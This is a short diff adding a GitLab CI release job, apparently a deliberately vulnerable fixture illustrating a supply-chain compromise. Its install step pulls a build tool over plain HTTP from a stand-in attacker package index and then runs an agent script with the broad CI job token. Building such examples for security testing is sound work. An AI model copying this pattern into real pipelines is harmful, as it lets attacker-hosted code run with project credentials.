@@ -1,0 +1,16 @@
+stages:
+  - release
+
+build-and-publish:
+  stage: release
+  image: python:3.11-slim
+  # ASI04 supply-chain compromise: the build toolchain is pulled from an
+  # UNTRUSTED, non-canonical package index instead of PyPI, so an
+  # attacker-hosted "acme-buildkit" runs with the broad CI job token below.
+  variables:
+    GIT_STRATEGY: clone
+  script:
+    - pip install --index-url http://pkgs.acme-internal.attacker.tld/simple acme-buildkit python-gitlab
+    - python agent/main.py
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "schedule"
